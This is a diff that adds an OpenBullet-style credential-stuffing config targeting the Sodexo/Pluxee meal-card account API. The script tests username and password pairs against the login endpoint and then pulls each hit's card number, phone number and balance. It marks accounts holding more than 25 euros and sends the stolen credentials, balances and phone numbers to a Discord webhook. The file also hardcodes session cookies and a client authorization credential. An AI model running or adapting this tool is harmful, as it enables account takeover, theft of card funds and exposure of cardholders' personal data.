@@ -1,0 +1,162 @@
+[SETTINGS]
+{
+  "Name": "Pluxee IOS API",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2024-01-10T00:55:21.7478408+01:00",
+  "AdditionalInfo": "",
+  "Author": "★彡 TayKow  彡★",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api-moncompte.sodexopass.fr/v2.7/token" 
+  CONTENT "{\"password\":\"<PASS>\",\"username\":\"<USER>\",\"grant_type\":\"password\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: api-moncompte.sodexopass.fr" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Cookie: TS01fc38cf=0156a001cfa273b834037f8119168de76c961bc73e7704267d3c3ccb65153cab04a5d99a0079f9476701decce78e72144b8161ee25; TS01fc38cf030=0160ae77eb524834878eb8881c011e57b2de16a973c7565cc232c7ab2dd341ac52f55a757b693461b7e30842f0159b5e7c0f335ff4; SERVERID=11" 
+  HEADER "User-Agent: PassRestaurant/2691 CFNetwork/1485 Darwin/23.1.0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: /" 
+  HEADER "Accept-Language: fr-FR,fr;q=0.9" 
+  HEADER "Content-Length: 79" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Authorization: Basic MDY2MzIwMTE0OTU2NzUwY19mOTE2MWY0NmFlODgzZmQyNTgwNGU4MDE6OTgzOGI2MDJkMDNiZWI2OTFkZWVlYzZhMjNjMzg1ZjNlYTZlMWNkMg==" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The user is not found" 
+    KEY "USER_404" 
+    KEY "The format of the user password is incorrect" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Retry OR 
+    KEY "The service of the third transmitter is totally unavailable" 
+    KEY "Request Rejected" 
+
+PARSE "<COOKIES(TS01fc38cf)>" LR "" "" -> VAR "TS01fc38cf" 
+
+PARSE "<COOKIES(TS01fc38cf030)>" LR "" "" -> VAR "TS01fc38cf030" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "access_token" 
+
+REQUEST GET "https://api-moncompte.sodexopass.fr/v2.7/066320114956750c/account/cards?domain_perimeters%5Bdomain_perimeter%5D%5B0%5D%5Bproduct_code%5D=restaurant&domain_perimeters%5Bdomain_perimeter%5D%5B0%5D%5Bsupport_code%5D=carte&include_virtual_cards=true" 
+  
+  HEADER "Host: api-moncompte.sodexopass.fr" 
+  HEADER "Accept: /" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cookie: TS01fc38cf=<TS01fc38cf>; TS01fc38cf030=<TS01fc38cf030>; SERVERID=12" 
+  HEADER "User-Agent: PassRestaurant/2691 CFNetwork/1485 Darwin/23.1.0" 
+  HEADER "Accept-Language: fr-FR,fr;q=0.9" 
+  HEADER "Authorization: Bearer <access_token>" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+KEYCHECK 
+  KEYCHAIN Retry OR 
+    KEY "Request Rejected" 
+  KEYCHAIN Success OR 
+    KEY "{\"result\":{\"" 
+
+PARSE "<SOURCE>" LR "\",\"card_number\":\"" "\",\"type_card\":\"" -> VAR "CARD" 
+
+KEYCHECK 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "\",\"status\":\"Expired\",\"expiry" 
+  KEYCHAIN Success OR 
+    KEY ",\"status\":\"Active\",\"expiry_date" 
+
+REQUEST GET "https://api-moncompte.sodexopass.fr/v2.7/066320114956750c/account/consumer" 
+  
+  HEADER "Host: api-moncompte.sodexopass.fr" 
+  HEADER "Accept: /" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cookie: SERVERID=12; TS01fc38cf=<TS01fc38cf>" 
+  HEADER "User-Agent: PassRestaurant/2691 CFNetwork/1485 Darwin/23.1.0" 
+  HEADER "Accept-Language: fr-FR,fr;q=0.9" 
+  HEADER "Authorization: Bearer <access_token>" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+KEYCHECK 
+  KEYCHAIN Retry OR 
+    KEY "Request Rejected" 
+  KEYCHAIN Success OR 
+    KEY "{\"result\"" 
+
+PARSE "<SOURCE>" LR "nternational_phone_number\":\"+33" "\",\"agreements" CreateEmpty=FALSE -> CAP "N° de téléphone" "0" "" 
+
+REQUEST GET "https://api-moncompte.sodexopass.fr/v2.7/066320114956750c/account/cards/<CARD>/balance?card_type=THREEPART&domain_perimeter%5Bproduct_code%5D=restaurant&domain_perimeter%5Bsupport_code%5D=carte" 
+  
+  HEADER "Host: api-moncompte.sodexopass.fr" 
+  HEADER "Accept: /" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cookie: TS01fc38cf=<TS01fc38cf>; TS01fc38cf030=<TS01fc38cf030>; SERVERID=12" 
+  HEADER "User-Agent: PassRestaurant/2691 CFNetwork/1485 Darwin/23.1.0" 
+  HEADER "Accept-Language: fr-FR,fr;q=0.9" 
+  HEADER "Authorization: Bearer <access_token>" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+KEYCHECK 
+  KEYCHAIN Retry OR 
+    KEY "Request Rejected" 
+  KEYCHAIN Success OR 
+    KEY "{\"result\"" 
+
+PARSE "<SOURCE>" JSON "overall_balance" CreateEmpty=FALSE -> CAP "Solde Total" "" "€" 
+
+PARSE "<SOURCE>" JSON "available_credit" CreateEmpty=FALSE -> CAP "Crédit Utilisable" "" "€" 
+
+PARSE "<SOURCE>" JSON "overall_balance" -> VAR "balance" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<balance>" GreaterThan "25" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<balance>" LessThan "25" 
+
+REQUEST POST "https://discord.com/api/webhooks/1194427649267863672/czUfLoB5DtL5NmNAXCkxrDtk199G2FdP3EYhEF67dVMPr7kEfvfiRxQ8mkZnCbUKrIhr" 
+  CONTENT "{\"content\":\"<USER>:<PASS> | Solde Total = <Solde Total> | Solde Utilisable = <Crédit Utilisable> | N° de téléphone = <N° de téléphone>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
